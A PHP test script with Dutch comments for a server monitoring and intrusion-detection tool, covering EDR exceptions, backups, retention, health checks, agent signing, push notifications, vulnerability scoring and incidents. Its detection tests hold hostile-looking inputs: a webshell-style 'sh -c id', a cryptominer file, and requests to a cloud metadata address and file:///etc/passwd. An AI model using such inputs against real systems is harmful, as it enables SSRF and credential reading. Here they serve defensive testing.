$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$hc0 = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn();
$xid = Exceptions::save(['name' => 'Healthchecks', 'target' => 'edr', 'rule' => 'rz-webshell', 'scope' => 'host', 'scope_val' => $ha,
    'cond' => ['parent' => ['uwsgi'], 'cmd' => ['manage.py sendreports']]], 'ci');
$hcx = ['k' => 'x', 't' => time(), 'pid' => 6060, 'st' => 1, 'uid' => 1000, 'u' => 'rehman', 'exe' => '/usr/bin/python3.14', 'comm' => 'python3', 'argv' => ['python3', './manage.py', 'sendreports', '--loop'], 'cmd' => 'python3 ./manage.py sendreports --loop', 'pc' => 'uwsgi'];
Edr::process($host, ['ev' => [$hcx]]);
$row = q("SELECT * FROM edr_events WHERE host_id = ? ORDER BY id DESC LIMIT 1", [$ha])->fetch();
$d = json_decode((string) $row['data'], true);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn() === $hc0 && $row['own'] === 'exc' && $d['_exc'] === 'Healthchecks' && str_contains((string) ($d['_would'] ?? ''), 'shell'),
    'uitzondering raak: geen incident, wel een groene regel met de naam en welke regel het zou raken');
ok((int) q('SELECT hits FROM ids_exceptions WHERE id = ?', [$xid])->fetchColumn() === 1, 'teller van de uitzondering');
$hcx['pid'] = 6061; $hcx['cmd'] = 'sh -c id'; $hcx['argv'] = ['sh', '-c', 'id']; $hcx['exe'] = '/usr/bin/dash';
Edr::process($host, ['ev' => [$hcx]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn() === $hc0 + 1, 'een andere opdracht van dezelfde webserver blijft gewoon een incident');
// Nooit: YARA blijft altijd, ook met een uitzondering op het pad
Exceptions::save(['name' => 'alles in tmp', 'target' => 'edr', 'cond' => ['path' => ['/tmp/**']]], 'ci');
Edr::process($host, ['ev' => [['k' => 'f', 't' => time(), 'path' => '/tmp/miner', 'size' => 9, 'elf' => 1, 'x' => 1, 'sha' => str_repeat('7', 64), 'yara' => 'rz_cryptominer']]]);
ok((bool) q("SELECT 1 FROM ids_incidents WHERE host_id = ? AND dkey LIKE 'rz-yara|%' AND detail LIKE '%/tmp/miner%'", [$ha])->fetchColumn(), 'YARA-treffer blijft een incident, ook met een uitzondering op het pad');
// IDS: root-login vanaf je eigen adres
Exceptions::save(['name' => 'Thuis', 'target' => 'ids', 'rule' => 'rootlogin', 'cond' => ['ip' => ['86.85.247.15']]], 'ci');
ok(Exceptions::ids($host, 'rootlogin', '86.85.247.15', 'Root-login', '', '86.85.247.15') !== null && Exceptions::ids($host, 'rootlogin', '203.0.113.9', 'Root-login', '', '203.0.113.9') === null
    && Exceptions::ids($host, 'decoy_port', 'x', 'Lokaas', '', '86.85.247.15') === null, 'IDS: root-login vanaf thuis uitgezonderd, van elders niet; lokaas nooit');
// Sets: met één knop, en geen dubbele regels
$n1 = Exceptions::addSet('plex', 'ci'); $n2 = Exceptions::addSet('plex', 'ci');
ok($n1 === 1 && $n2 === 0 && Exceptions::ids($host, 'out_country', 'Plex Media Serv|GB', 'Uitgaand', '', '1.2.3.4') !== null, 'set Plex met één knop toegevoegd (en niet dubbel); Plex naar elk land uitgezonderd');
// Voorstellen uit de meldingen, met één knop toevoegen
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip, hits) VALUES (?, 1, 'out_country', 'rclone|US', 'Uitgaande verbinding naar US: rclone', '', '9.9.9.9', 40), (?, 1, 'out_country', 'rclone|IE', 'Uitgaande verbinding naar IE: rclone', '', '9.9.9.8', 25), (?, 1, 'out_country', 'Plex Media Serv|GB', 'Uitgaande verbinding naar GB: Plex Media Serv', '', '8.8.4.4', 99)", [$ha, $ha, $ha]);
$pr = array_values(array_filter(Exceptions::proposals(), static fn($p) => ($p['cond']['program'][0] ?? '') === 'rclone'));
ok(count($pr) === 1 && $pr[0]['hits'] === 65 && $pr[0]['rule'] === 'out_country', 'voorstel: rclone naar US en IE samen, 65×');
ok(!array_filter(Exceptions::proposals(), static fn($p) => str_starts_with((string) ($p['cond']['program'][0] ?? ''), 'Plex')), 'wat al uitgezonderd is (Plex) staat niet bij de voorstellen');
ok(Exceptions::addProposals([$pr[0]['id']], 'ci') === 1 && !array_filter(Exceptions::proposals(), static fn($p) => ($p['cond']['program'][0] ?? '') === 'rclone'), 'voorstel met één knop toegevoegd; daarna geen voorstel meer');
// Exporteren en importeren
$exp = Exceptions::export();
$cnt = (int) q('SELECT COUNT(*) FROM ids_exceptions')->fetchColumn();
q('DELETE FROM ids_exceptions');
$imp = Exceptions::import($exp, 'ci');
ok($imp['added'] === $cnt && !$imp['skipped'] && (int) q("SELECT scope_val FROM ids_exceptions WHERE name = 'Healthchecks'")->fetchColumn() === (int) $ha, 'exporteren en importeren (server op naam terug naar zijn id)');
// Eigen processen: het kenmerk van RzSense in een opdracht
$mark = Edr::selfMark();
ok(preg_match('/^[0-9a-f]{24}$/', $mark) === 1 && rz_sh('id') === ": rzmon:$mark; id" && Edr::isSelfCmd(rz_sh('getent hosts 1.2.3.4')) && Edr::isSelfCmd('/bin/sh -c /usr/bin/php ' . SM_ROOT . '/cron/run.php')
    && !Edr::isSelfCmd(': rzmon:ffffffffffffffffffffffff; id'), 'kenmerk van RzSense: in elke opdracht, en alleen het echte kenmerk telt');
$c0 = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 7070, 'st' => 1, 'uid' => 48, 'u' => 'apache', 'exe' => '/usr/bin/bash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'x'], 'cmd' => rz_sh('timeout 2 getent hosts 1.2.3.4'), 'pc' => 'php-fpm']]]);
$row = q("SELECT * FROM edr_events WHERE host_id = ? ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr'", [$ha])->fetchColumn() === $c0 && $row['own'] === 'rzmon' && !str_contains((string) $row['data'], $mark),
    'opdracht van RzSense (php-fpm → sh): geen webshell-melding, eigen regel, en het kenmerk wordt niet bewaard');
save_setting('ids_mode', 'learn');

// 1.133.0: handmatige back-ups opruimen (0 = alles bewaren); geüploade blijven altijd
$bkOld = $GLOBALS['sm_config']['backup_dir'] ?? null;
$GLOBALS['sm_config']['backup_dir'] = sys_get_temp_dir() . '/rzmon-ci-bk-' . getmypid();   // eigen lege map: echte back-ups blijven buiten schot
@mkdir(Backup::dir(), 0700, true);
$mkzip = static function (string $name): void { $z = new ZipArchive(); $z->open(Backup::dir() . "/$name", ZipArchive::CREATE); $z->addFromString('info.txt', 'ci'); $z->close(); };
foreach ([1, 2, 3, 4] as $d) { $mkzip("rzmon-backup-2026010$d-120000-manual.zip"); }
$mkzip('rzmon-backup-20260101-130000-upload.zip');
save_setting('backup_keep_manual', '0');
Backup::prune();
$mine = static fn(string $t) => count(glob(Backup::dir() . "/rzmon-backup-2026*-$t.zip") ?: []);
ok($mine('manual') === 4, 'handmatige back-ups: 0 = alles bewaren');
save_setting('backup_keep_manual', '2');
Backup::prune();
ok($mine('manual') === 2 && is_file(Backup::dir() . '/rzmon-backup-20260104-120000-manual.zip') && !is_file(Backup::dir() . '/rzmon-backup-20260101-120000-manual.zip') && $mine('upload') === 1,
    'handmatige back-ups: de nieuwste 2 blijven, geüploade blijven staan');
foreach (glob(Backup::dir() . '/*') ?: [] as $f) { unlink($f); }
rmdir(Backup::dir());
$GLOBALS['sm_config']['backup_dir'] = $bkOld;
save_setting('backup_keep_manual', '0');

// 1.134.0: Dashboard: alles samen; alleen-lezen ziet geen analyse, CVE's of netwerk
$hm = Home::data(true, '30d');
ok($hm['full'] && $hm['period'] === '30d' && is_int($hm['score']) && isset($hm['ids']['open'][1], $hm['ids']['open'][2], $hm['avail']['series'], $hm['ids']['series']['blk'])
    && array_key_exists('vulns', $hm) && array_key_exists('net', $hm) && is_array($hm['events']) && count($hm['events']) <= 8, 'dashboard: score, IDS, beschikbaarheid, CVE en netwerk samen');
$ro = Home::data(false, 'xx');
ok(!$ro['full'] && $ro['period'] === '7d' && !isset($ro['todo']) && !isset($ro['vulns']) && !isset($ro['net']) && isset($ro['ids']['open_total'])
    && !array_filter($ro['events'], static fn($e) => in_array($e['kind'], ['sec', 'info'], true)), 'dashboard alleen-lezen: geen analyse, CVE\'s, netwerk of beveiligingsmeldingen');

// 1.136.0: bewaartermijnen: eerst per uur samenvatten, dan pas ruwe metingen weg
q("INSERT INTO checks (host_id, type, target, name) VALUES (?, 'ping', '127.0.0.1', 'Bewaren')", [$ha]);
$rc = (int) db()->lastInsertId();
$h40 = date('Y-m-d H:00:00', time() - 40 * 86400);   // twee metingen in hetzelfde uur, 40 dagen geleden
q("INSERT INTO results (check_id, status, value, created_at) VALUES (?, 0, 10, ?), (?, 2, 30, ? + INTERVAL 10 MINUTE), (?, 0, 5, NOW() - INTERVAL 2 DAY)", [$rc, $h40, $rc, $h40, $rc]);
save_setting('hourly_rolled', date('Y-m-d H:00:00', time() - 50 * 86400));
save_setting('retention_days', '30');
Retention::purge();
ok((int) q('SELECT COUNT(*) FROM results WHERE check_id = ?', [$rc])->fetchColumn() === 3, 'bewaren: niets weg zolang het uur nog niet samengevat is');
for ($i = 0; $i < 10 && Retention::rollup(); $i++) {
}
Retention::purge();
$hr = q('SELECT * FROM results_hourly WHERE check_id = ? ORDER BY hour', [$rc])->fetchAll();
ok((int) q('SELECT COUNT(*) FROM results WHERE check_id = ?', [$rc])->fetchColumn() === 1 && count($hr) >= 2 && (int) $hr[0]['n'] === 2 && (int) $hr[0]['n_crit'] === 1 && abs((float) $hr[0]['v_avg'] - 20) < 0.01,
    'bewaren: na 30 dagen alleen het uurgemiddelde (2 metingen, 1 critical, gemiddeld 20)');
save_setting('hourly_days', '30');
Retention::purge();
ok((int) q('SELECT COUNT(*) FROM results_hourly WHERE check_id = ?', [$rc])->fetchColumn() === 1, 'bewaren: uurgemiddelden ouder dan ingesteld weg');
save_setting('hourly_days', '180');

// 1.137.0: hartslag tijdens een lange run en ingehaalde metingen (wachtrij)
$qh = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
q("UPDATE hosts SET agent_seen = NOW() - INTERVAL 1 HOUR, agent_busy = NULL WHERE id = ?", [$ha]);
ok(AgentQueue::beat($qh, ['beat' => 1, 'busy_since' => time() - 120]) && strtotime((string) q('SELECT agent_seen FROM hosts WHERE id = ?', [$ha])->fetchColumn()) > time() - 10
    && q('SELECT agent_busy FROM hosts WHERE id = ?', [$ha])->fetchColumn() !== null, 'hartslag: bezig sinds 2 minuten telt als contact');
q("UPDATE hosts SET agent_seen = NOW() - INTERVAL 1 HOUR WHERE id = ?", [$ha]);
ok(!AgentQueue::beat($qh, ['beat' => 1, 'busy_since' => time() - 3600]) && strtotime((string) q('SELECT agent_seen FROM hosts WHERE id = ?', [$ha])->fetchColumn()) < time() - 3000,
    'hartslag: een run die al een uur loopt (hangt) telt niet');
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold) VALUES (?, 'cpu', '', 'CPU wachtrij', 80, 95), (?, 'disk', '/data', 'Disk wachtrij', 80, 90)", [$ha, $ha]);
$qc = (int) q("SELECT id FROM checks WHERE name = 'CPU wachtrij'")->fetchColumn();
$qd = (int) q("SELECT id FROM checks WHERE name = 'Disk wachtrij'")->fetchColumn();
$bl = [['t' => time() - 600, 'cpu' => 97.5, 'mem' => ['total' => 100, 'avail' => 50], 'disks' => [['mount' => '/data', 'total' => 100, 'avail' => 15]]],
    ['t' => time() - 540, 'cpu' => 12, 'mem' => ['total' => 100, 'avail' => 50], 'disks' => [['mount' => '/data', 'total' => 100, 'avail' => 50]]]];
$n1 = AgentQueue::backlog($qh, $bl);
$n2 = AgentQueue::backlog($qh, $bl);   // nog een keer hetzelfde: niets dubbel
$r1 = q('SELECT status, value FROM results WHERE check_id = ? ORDER BY created_at', [$qc])->fetchAll();
$rd = q('SELECT status, value FROM results WHERE check_id = ? ORDER BY created_at', [$qd])->fetchAll();
ok($n1 >= 4 && $n2 === 0 && count($r1) === 2 && (int) $r1[0]['status'] === 2 && abs((float) $r1[0]['value'] - 97.5) < 0.01 && (int) $r1[1]['status'] === 0
    && count($rd) === 2 && abs((float) $rd[0]['value'] - 85) < 0.01 && (int) $rd[0]['status'] === 1,
    'wachtrij: ingehaalde metingen op hun eigen tijd, met status, en niet dubbel');

// 1.138.0: nieuwe checks (DNS, tijd, schijfgezondheid, UPS, MariaDB) en HTTP met verwachte inhoud en veilige adressen
ok(ExtraChecks::urlBlocked('http://169.254.169.254/latest/meta-data/') !== null && ExtraChecks::urlBlocked('file:///etc/passwd') !== null
    && ExtraChecks::urlBlocked('http://127.0.0.1:8080/health') === null && ExtraChecks::urlBlocked('https://192.168.1.10/') === null,
    'HTTP: metadata-dienst en file:// geweigerd, LAN en localhost toegestaan');
$jb = '{"status":"ok","data":[{"ok":true}],"n":3}';
ok(ExtraChecks::bodyCheck($jb, ['json' => 'data.0.ok', 'json_value' => 'true']) === null && ExtraChecks::bodyCheck($jb, ['json' => 'status', 'json_value' => 'OK']) === null
    && ExtraChecks::bodyCheck($jb, ['json' => 'status', 'json_value' => 'down']) !== null && ExtraChecks::bodyCheck($jb, ['json' => 'x.y']) !== null
    && ExtraChecks::bodyCheck('niet json', ['json' => 'a']) !== null && ExtraChecks::bodyCheck($jb, ['expect' => '"ok"']) === null && ExtraChecks::bodyCheck($jb, ['expect' => 'kapot']) !== null,
    'HTTP: verwachte tekst en JSON-veld met waarde');
q("UPDATE hosts SET mode = 'agent', agent_seen = NOW(), agent_busy = NULL WHERE id = ?", [$ha]);
$xh = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$put = static function (string $m, $v) use ($ha): void {
    q('INSERT INTO agent_data (host_id, metric, value, updated_at) VALUES (?, ?, ?, NOW()) ON DUPLICATE KEY UPDATE value = VALUES(value), updated_at = NOW()', [$ha, $m, json_encode($v)]);
};
$put('smart', [['dev' => '/dev/nvme0', 'model' => 'SSD', 'passed' => true, 'temp' => 41, 'wear' => 83, 'media_err' => 0],
    ['dev' => '/dev/sda', 'model' => 'HDD', 'passed' => true, 'temp' => 36, 'realloc' => 8, 'pending' => 2], ['dev' => '/dev/sdb', 'passed' => false, 'temp' => 70]]);
$ck = static fn(string $type, string $target, $w, $c) => ['id' => 0, 'type' => $type, 'target' => $target, 'warn_threshold' => $w, 'crit_threshold' => $c, 'options' => null];
$r1 = Checks::run($ck('smart', '/dev/nvme0', 55, 65), $xh);
$r2 = Checks::run($ck('smart', '/dev/sda', 55, 65), $xh);
$r3 = Checks::run($ck('smart', '', 55, 65), $xh);
ok($r1['status'] === STATUS_WARN && str_contains($r1['message'], '83%') && $r2['status'] === STATUS_WARN && str_contains($r2['message'], '8 ')
    && $r3['status'] === STATUS_CRIT && (float) $r3['value'] === 70.0, 'schijfgezondheid: slijtage en sectoren = warning, test mislukt = critical, hoogste temperatuur');
$put('ups', [['name' => 'eaton', 'status' => 'OL', 'charge' => 100, 'runtime' => 1800, 'load' => 20]]);
$u1 = Checks::run($ck('ups', '', 50, 20), $xh);
$put('ups', [['name' => 'eaton', 'status' => 'OB DISCHRG', 'charge' => 64, 'runtime' => 1260, 'load' => 31]]);
$u2 = Checks::run($ck('ups', 'eaton', 50, 20), $xh);
$put('ups', [['name' => 'eaton', 'status' => 'OB LB', 'charge' => 9]]);
$u3 = Checks::run($ck('ups', 'eaton', 50, 20), $xh);
ok($u1['status'] === STATUS_OK && $u2['status'] === STATUS_WARN && str_contains($u2['message'], '21 min') && $u3['status'] === STATUS_CRIT, 'UPS: op het net OK, op de batterij warning, bijna leeg critical');
$put('time', ['src' => 'chrony', 'sync' => true, 'offset_ms' => -4.2]);
$t1 = Checks::run($ck('ntp', '', 100, 1000), $xh);
$put('time', ['src' => 'chrony', 'sync' => true, 'offset_ms' => 250]);
$t2 = Checks::run($ck('ntp', '', 100, 1000), $xh);
$put('time', ['src' => 'timesyncd', 'sync' => false, 'offset_ms' => null]);
$t3 = Checks::run($ck('ntp', '', 100, 1000), $xh);
ok($t1['status'] === STATUS_OK && abs((float) $t1['value'] - 4.2) < 0.01 && $t2['status'] === STATUS_WARN && $t3['status'] === STATUS_WARN, 'tijd: afwijking in ms, niet gesynchroniseerd = warning');
$dbc = config('db');
$my = Checks::run(['id' => 0, 'type' => 'mysql', 'target' => ($dbc['host'] ?? '127.0.0.1') . ':' . ($dbc['port'] ?? 3306), 'warn_threshold' => 500, 'crit_threshold' => 2000,
    'options' => json_encode(['user' => $dbc['user'], 'pass' => $dbc['pass']])], $xh);
$myBad = Checks::run(['id' => 0, 'type' => 'mysql', 'target' => ($dbc['host'] ?? '127.0.0.1') . ':' . ($dbc['port'] ?? 3306), 'warn_threshold' => 500, 'crit_threshold' => 2000,
    'options' => json_encode(['user' => $dbc['user'], 'pass' => 'fout-wachtwoord'])], $xh);
ok($my['status'] === STATUS_OK && str_contains($my['message'], 'verbindingen') && $myBad['status'] === STATUS_CRIT
    && !str_contains((string) ExtraChecks::maskOptions(json_encode(['user' => 'x', 'pass' => 'geheim'])), 'geheim'), 'MariaDB: inloggen lukt (met verbindingen), fout wachtwoord = critical, wachtwoord nooit naar de browser');

// 1.139.0: ondertekende agent (ed25519): klopt, ontbreekt, of iemand heeft de agent gewijzigd
$sd = sys_get_temp_dir() . '/rzmon-sign-' . getmypid();
@mkdir($sd);
$kp = sodium_crypto_sign_keypair();
$der = base64_encode("\x30\x2a\x30\x05\x06\x03\x2b\x65\x70\x03\x21\x00" . sodium_crypto_sign_publickey($kp));
file_put_contents("$sd/rzmon-agent.sh", preg_replace('/^AGENT_SIGN_PUB=".*"$/m', 'AGENT_SIGN_PUB="' . $der . '"', (string) file_get_contents(SM_ROOT . '/agent/rzmon-agent.sh')));
copy(SM_ROOT . '/agent/install-agent.sh', "$sd/install-agent.sh");
$miss = AgentSign::status($sd);
foreach (['rzmon-agent.sh', 'install-agent.sh'] as $f) {
    file_put_contents("$sd/$f.sig", base64_encode(sodium_crypto_sign_detached((string) file_get_contents("$sd/$f"), sodium_crypto_sign_secretkey($kp))));
}
$good = AgentSign::status($sd);
file_put_contents("$sd/install-agent.sh", "\necho kwaadaardig\n", FILE_APPEND);
$bad = AgentSign::status($sd);
array_map('unlink', glob("$sd/*") ?: []);
rmdir($sd);
ok(!$miss['signed'] && $good['valid'] && $bad['signed'] && !$bad['valid'] && $bad['files']['install-agent.sh'] === 'bad' && $bad['files']['rzmon-agent.sh'] === 'ok' && $good['nosodium'] === false,
    'ondertekende agent: ontbreekt, klopt, en een gewijzigd installatiescript valt op');

// 1.140.0: ntfy via een nep-server (php -S met een router die het verzoek bewaart; "fout"-token = 401)
$nd = sys_get_temp_dir() . '/rzmon-ntfy-' . getmypid();
@mkdir($nd);
file_put_contents("$nd/r.php", '<?php file_put_contents(__DIR__ . "/req.json", json_encode(["auth" => $_SERVER["HTTP_AUTHORIZATION"] ?? "", "body" => file_get_contents("php://input")]));'
    . ' if (($_SERVER["HTTP_AUTHORIZATION"] ?? "") === "Bearer fout") { http_response_code(401); echo "{\"error\":\"unauthorized\"}"; exit; } echo "{\"id\":\"x\"}";');
$port = 18000 + getmypid() % 1000;
$srv = proc_open([PHP_BINARY, '-S', "127.0.0.1:$port", "$nd/r.php"], [1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']], $pipes);
for ($i = 0; $i < 50 && !@fsockopen('127.0.0.1', $port); $i++) {
    usleep(100000);
}
$nOk = Ntfy::send('🔴 Critical: web', "regel 1\nregel 2", 1, ['url' => 'https://rz.example/ack?x=1', 'url_title' => '✔ Bevestigen'],
    ['server' => "http://127.0.0.1:$port/", 'topic' => 'rzmon-test_1', 'token' => 'tk_abc']);
$req = json_decode((string) @file_get_contents("$nd/req.json"), true) ?: [];
$body = json_decode((string) ($req['body'] ?? ''), true) ?: [];
$nBad = Ntfy::send('t', 'm', 0, [], ['server' => "http://127.0.0.1:$port", 'topic' => 'rzmon-test', 'token' => 'fout']);
$nTopic = Ntfy::send('t', 'm', 0, [], ['server' => "http://127.0.0.1:$port", 'topic' => 'geen spaties/', 'token' => '']);
$nFile = Ntfy::send('t', 'm', 0, [], ['server' => 'file:///etc/passwd', 'topic' => 'x', 'token' => '']);
save_setting('pushover_enabled', '0');
save_setting('ntfy_enabled', '1');
save_setting('ntfy_server', "http://127.0.0.1:$port");
save_setting('ntfy_topic', 'rzmon-test');
save_setting('ntfy_token', 'gebruiker:wachtwoord');
$push = Push::send('Test', 'bericht', 2);
$req2 = json_decode((string) @file_get_contents("$nd/req.json"), true) ?: [];
save_setting('ntfy_enabled', '0');
proc_terminate($srv);
proc_close($srv);
array_map('unlink', glob("$nd/*") ?: []);
rmdir($nd);
ok($nOk['ok'] && ($body['topic'] ?? '') === 'rzmon-test_1' && ($body['title'] ?? '') === '🔴 Critical: web' && ($body['priority'] ?? 0) === 4
    && ($body['click'] ?? '') === 'https://rz.example/ack?x=1' && ($body['actions'][0]['label'] ?? '') === '✔ Bevestigen' && ($req['auth'] ?? '') === 'Bearer tk_abc',
    'ntfy: JSON met titel (emoji), prioriteit hoog = 4, knop Bevestigen en token');
ok(!$nBad['ok'] && str_contains((string) $nBad['error'], 'unauthorized') && !$nTopic['ok'] && !$nFile['ok'], 'ntfy: fout token, ongeldig onderwerp en geen http(s) worden geweigerd');
ok($push['ok'] && Push::enabled() === false && ($req2['auth'] ?? '') === 'Basic ' . base64_encode('gebruiker:wachtwoord')
    && (json_decode((string) ($req2['body'] ?? ''), true)['priority'] ?? 0) === 5, 'Push: alleen ntfy aan werkt (emergency = 5, gebruiker:wachtwoord als Basic)');

// 1.141.0: risicoscore, accepteren tot een datum, controle na bijwerken, SBOM
ok(Vulns::risk(4, 10.0, true, 1.0, true) === 100 && Vulns::risk(2, 5.3, false, null, false) === 27 && Vulns::risk(3, null, false, 0.01, false) > Vulns::risk(3, null, false, null, false)
    && Vulns::risk(3, 7.5, false, null, true) - Vulns::risk(3, 7.5, false, null, false) === 10, 'risicoscore: ernst, KEV, EPSS en bereikbaar tellen mee (0–100)');
q("INSERT INTO vuln_inventory (host_id, mgr, os_id, os_version, os_name, ecosystem, hash, packages, exposed, updated_at) VALUES (?, 'dpkg', 'debian', '12', 'Debian 12', 'Debian:12', 'abc', ?, ?, ?)",
    [$ha, json_encode([['libssl3', '3.0.11-1', 'amd64', 'openssl', '3.0.11-1'], ['openssh-server', '1:9.2p1-2', 'amd64', 'openssh', '1:9.2p1-2']]), json_encode([['openssh', 22, 'tcp']]), now()]);
q("INSERT INTO vuln_cve (cve, severity, cvss, kev, epss) VALUES ('CVE-2099-0001', 4, 9.8, 1, 0.5), ('CVE-2099-0002', 2, 5.0, 0, NULL), ('CVE-2099-0003', 3, 7.5, 0, 0.02)");
q("INSERT INTO vuln_findings (host_id, package, version, source, vuln_id, cve, fixed_version, first_seen) VALUES
   (?, 'openssl', '3.0.11-1', 'libssl3', 'DSA-1', 'CVE-2099-0001', '3.0.13-1', NOW()), (?, 'openssh', '1:9.2p1-2', 'openssh-server', 'DSA-2', 'CVE-2099-0002', NULL, NOW()),
   (?, 'openssh', '1:9.2p1-2', 'openssh-server', 'DSA-3', 'CVE-2099-0003', NULL, NOW())", [$ha, $ha, $ha]);
q("INSERT INTO vuln_ignore (cve, host_id, reason, until, created_by, created_at) VALUES ('CVE-2099-0002', ?, 'test', CURDATE() - INTERVAL 1 DAY, 'ci', NOW()),
   ('CVE-2099-0003', ?, 'test', CURDATE() + INTERVAL 30 DAY, 'ci', NOW())", [$ha, $ha]);
$vo = Vulns::overview();
$byCve = array_column(array_filter($vo['findings'], fn($f) => $f['host_id'] === $ha), null, 'cve');
ok(!$byCve['CVE-2099-0002']['ignored'] && $byCve['CVE-2099-0003']['ignored'] && $byCve['CVE-2099-0001']['risk'] === 85 && $byCve['CVE-2099-0003']['risk'] > Vulns::risk(3, 7.5, false, 0.02, false),
    'verlopen acceptatie telt weer mee, een lopende niet; openssh luistert op het netwerk (hoger risico)');
$sb = Vulns::sbom($ha);
$purls = array_column($sb['components'] ?? [], 'purl');
$v1 = array_values(array_filter($sb['vulnerabilities'] ?? [], fn($v) => $v['id'] === 'CVE-2099-0001'))[0] ?? [];
ok(($sb['bomFormat'] ?? '') === 'CycloneDX' && in_array('pkg:deb/debian/libssl3@3.0.11-1?arch=amd64&distro=debian-12&upstream=openssl', $purls, true)
    && ($v1['affects'][0]['ref'] ?? '') === 'pkg:deb/debian/libssl3@3.0.11-1?arch=amd64&distro=debian-12&upstream=openssl' && ($v1['ratings'][0]['severity'] ?? '') === 'critical'
    && in_array(['name' => 'cisa:kev', 'value' => 'true'], $v1['properties'] ?? [], true), 'SBOM: CycloneDX met purl per pakket en de kwetsbaarheden eraan gekoppeld');
// Bijwerken via de agent gelukt; daarna een nieuwe softwarelijst en een scan zonder de openssl-CVE
$upAt = date('Y-m-d H:i:s', time() - 120);
q('UPDATE hosts SET vuln_upgrade_status = ? WHERE id = ?', [json_encode(['state' => 'ok', 'at' => $upAt, 'pkgs' => ['libssl3', 'openssh-server']]), $ha]);
q("INSERT INTO vuln_resolved (host_id, package, version, cve, severity, first_seen, resolved_at) VALUES (?, 'openssl', '3.0.11-1', 'CVE-2099-0001', 4, NOW(), NOW())", [$ha]);
q("DELETE FROM vuln_findings WHERE host_id = ? AND cve = 'CVE-2099-0001'", [$ha]);
q("UPDATE vuln_findings SET fixed_version = '1:9.2p1-3' WHERE host_id = ? AND cve = 'CVE-2099-0003'", [$ha]);
$ver = Vulns::verifyUpgrade($ha);
ok(($ver['fixed'] ?? null) === 1 && ($ver['still'] ?? []) === ['openssh' => 1] && Vulns::verifyUpgrade($ha) === null
    && (Vulns::overview()['resolved'] ?? 0) >= 1, 'na bijwerken gecontroleerd: 1 opgelost, openssh nog open (met oplossing); maar één keer');
q('DELETE FROM vuln_findings WHERE host_id = ?', [$ha]);
q('DELETE FROM vuln_inventory WHERE host_id = ?', [$ha]);
q("DELETE FROM vuln_ignore WHERE cve LIKE 'CVE-2099-%'");
q('UPDATE hosts SET vuln_upgrade_status = NULL WHERE id = ?', [$ha]);

// 1.142.0: incidenten uit monitoring en IDS, status/eigenaar/notities, vanzelf opgelost; en het rapport
q("INSERT INTO checks (host_id, type, name, status, problem_since, last_message) VALUES (?, 'ping', 'inc-ping', 2, NOW() - INTERVAL 10 MINUTE, 'onbereikbaar')", [$ha]);
$icid = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, name, status, problem_since) VALUES (?, 'ping', 'inc-kort', 2, NOW() - INTERVAL 1 MINUTE)", [$ha]);
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, status) VALUES (?, 2, 'test', 'inc-1', 'Brute force', 'open')", [$ha]);
$idsId = (int) db()->lastInsertId();
$n1 = Incidents::sync();
$c1 = (int) q('SELECT COUNT(*) FROM incidents')->fetchColumn();
Incidents::sync();
$n2 = (int) q('SELECT COUNT(*) FROM incidents')->fetchColumn() - $c1;   // geen nieuwe incidenten (samenvoegen mag wel)
$ci = q("SELECT * FROM incidents WHERE source = 'check' AND ref_id = ?", [$icid])->fetch();
// 1.144.0: een IDS-melding kan ook een stap van een ander (samengevoegd) incident zijn
$ii = q("SELECT * FROM incidents WHERE source = 'ids' AND (ref_id = ? OR id = (SELECT incident_id FROM incident_refs WHERE ref_id = ? LIMIT 1))", [$idsId, $idsId])->fetch();
ok($n1 >= 2 && $n2 === 0 && $ci && $ii && !q("SELECT 1 FROM incidents i JOIN checks c ON c.id = i.ref_id WHERE c.name = 'inc-kort'")->fetchColumn(),
    'incidenten: critical check (≥ 5 min) en IDS-incident, één keer; korte storing niet');
$adm = (string) q('SELECT username FROM users ORDER BY id LIMIT 1')->fetchColumn();
$e1 = Incidents::update((int) $ci['id'], $adm, null, $adm, 'router herstart');
$after = q('SELECT status, owner FROM incidents WHERE id = ?', [$ci['id']])->fetch();
$e2 = Incidents::update((int) $ci['id'], $adm, 'bestaat-niet', null, null);
ok($e1 === null && $after['status'] === 'ack' && $after['owner'] === $adm && $e2 !== null
    && (int) q("SELECT COUNT(*) FROM incident_notes WHERE incident_id = ? AND kind = 'note'", [$ci['id']])->fetchColumn() === 1, 'eigenaar kiezen zet hem in behandeling; notitie bewaard; onbekende status geweigerd');
q('UPDATE checks SET status = 0, problem_since = NULL WHERE id = ?', [$icid]);
Incidents::update((int) $ii['id'], $adm, 'resolved', null, null);
Incidents::sync();
ok(q('SELECT status FROM incidents WHERE id = ?', [$ci['id']])->fetchColumn() === 'resolved' && q('SELECT status FROM ids_incidents WHERE id = ?', [$idsId])->fetchColumn() === 'done'
    && str_contains((string) q("SELECT text FROM incident_notes WHERE incident_id = ? AND kind = 'status' ORDER BY id DESC LIMIT 1", [$ci['id']])->fetchColumn(), 'OK'),
    'check weer OK: vanzelf opgelost (met notitie); IDS-incident zelf gesloten: ook in IDS afgehandeld');
$rep = Report::html('7d');
ok(str_contains($rep, '<h2>Incidenten</h2>') && str_contains($rep, 'inc-ping') && str_contains($rep, 'Beschikbaarheid') && !str_contains($rep, '<script'),
    'rapport: losse HTML met samenvatting en incidenten, zonder scripts');
q("DELETE FROM checks WHERE name IN ('inc-ping', 'inc-kort')");

// 1.143.0: een oud (bcrypt-)wachtwoord werkt nog, en wordt bij het inloggen ongemerkt Argon2id; daarna werkt het ook
require_once SM_ROOT . '/src/auth.php';
